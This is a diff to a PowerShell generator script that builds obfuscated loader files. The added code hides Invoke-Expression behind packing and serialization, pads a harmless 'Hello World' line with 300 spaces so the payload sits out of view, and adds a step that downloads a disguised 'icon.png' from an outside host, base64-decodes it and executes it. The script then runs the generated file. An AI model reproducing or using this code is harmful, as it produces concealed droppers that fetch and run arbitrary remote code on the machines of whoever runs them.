@@ -22,30 +22,36 @@ function serialize_var() {
     $out
 }
 
-function gen_dload() {
+function gen_obfusrun($cmd) {
+    $out = serialize_var d $(pack $cmd.Split(' '))
+    $out += ';$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression")))
+    $out += '&$c $(u $d);'
+    $out
+}
 
+function gen_dload() {
+    gen_obfusrun 'Invoke-Expression $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest "https://trnila.eu/pvbs/icon.png" -UseBasicParsing).Content)));'
 }
 
 function prepare_1() {
-    $init=$(pack $(cat init.ps1).Split(' '))
-    Set-Content gen/1.ps1 "Write-Output 'Hello World';" -NoNewline -Encoding Unicode
-    Add-Content gen/1.ps1 (' '*300) -NoNewline
-    (cat unpack.ps1) -join '' | Add-Content gen/1.ps1
-    serialize_var i $init >> gen/1.ps1
-    '$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression"))) >> gen/1.ps1
-    echo '&$c $(u $i)' >> gen/1.ps1
-
-
-    .\gen\1.ps1
+    $out = ""
+    $out += "Write-Output 'Hello World';"
+    $out += ' ' * 300
+    $out += $(cat unpack.ps1) -join ''
+    $out += serialize_var i $(pack $(cat init.ps1).Split(' '))
+    $out += '$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression")))
+    $out += '&$c $(u $i);'
+    $out += gen_dload
+    $out
 }
 
 function prepare_2() {
-    cat unpack.ps1 > gen/2.ps1
-    cat init.ps1 >> gen/2.ps1
-
-    cat gen/2.ps1
-    echo =================
-    .\gen\2.ps1
+    cat unpack.ps1
+    cat init.ps1
+    gen_dload
 }
 
-prepare_1
+prepare_1 > gen/1.ps1
+prepare_2 > gen/2.ps1
+
+gen/2.ps1
